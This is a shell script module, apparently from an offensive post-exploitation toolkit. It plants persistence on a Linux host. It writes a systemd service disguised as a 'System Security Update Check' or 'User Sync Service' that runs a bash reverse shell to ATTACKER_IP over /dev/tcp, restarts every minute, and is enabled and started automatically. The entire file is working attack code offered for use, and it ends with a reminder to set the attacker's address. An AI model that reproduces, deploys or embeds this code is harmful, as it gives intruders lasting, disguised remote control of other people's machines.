# Persistence via Systemd Service
# Usage: load persistence/systemd_service.sh

print_header "Persistence: Systemd Service"

SERVICE_NAME="system-update-check.service"
SERVICE_PATH="/etc/systemd/system/$SERVICE_NAME"
# User level service if not root
USER_SERVICE_DIR="$HOME/.config/systemd/user"
USER_SERVICE_PATH="$USER_SERVICE_DIR/$SERVICE_NAME"

PAYLOAD="/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'"

if is_root; then
    print_with_label "Creating System Service (Root)..."
    
    cat <<EOF > "$SERVICE_PATH"
[Unit]
Description=System Security Update Check
After=network.target

[Service]
Type=simple
ExecStart=$PAYLOAD
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

    if [ -f "$SERVICE_PATH" ]; then
        print_success "Service created at $SERVICE_PATH"
        systemctl enable "$SERVICE_NAME" 2>/dev/null
        systemctl start "$SERVICE_NAME" 2>/dev/null
        print_success "Service enabled and started."
    else
        print_error "Failed to create service file."
    fi

else
    print_with_label "Creating User Service..."
    mkdir -p "$USER_SERVICE_DIR"
    
    cat <<EOF > "$USER_SERVICE_PATH"
[Unit]
Description=User Sync Service

[Service]
ExecStart=$PAYLOAD
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

    if [ -f "$USER_SERVICE_PATH" ]; then
        print_success "User service created at $USER_SERVICE_PATH"
        systemctl --user enable "$SERVICE_NAME" 2>/dev/null
        systemctl --user start "$SERVICE_NAME" 2>/dev/null
        print_success "User service enabled and started."
        print_with_label "Note: User must be logged in (or linger enabled) for this to run."
    else
        print_error "Failed to create user service file."
    fi
fi

print_with_label "REMINDER: Edit the service file to set ATTACKER_IP and ATTACKER_PORT!"
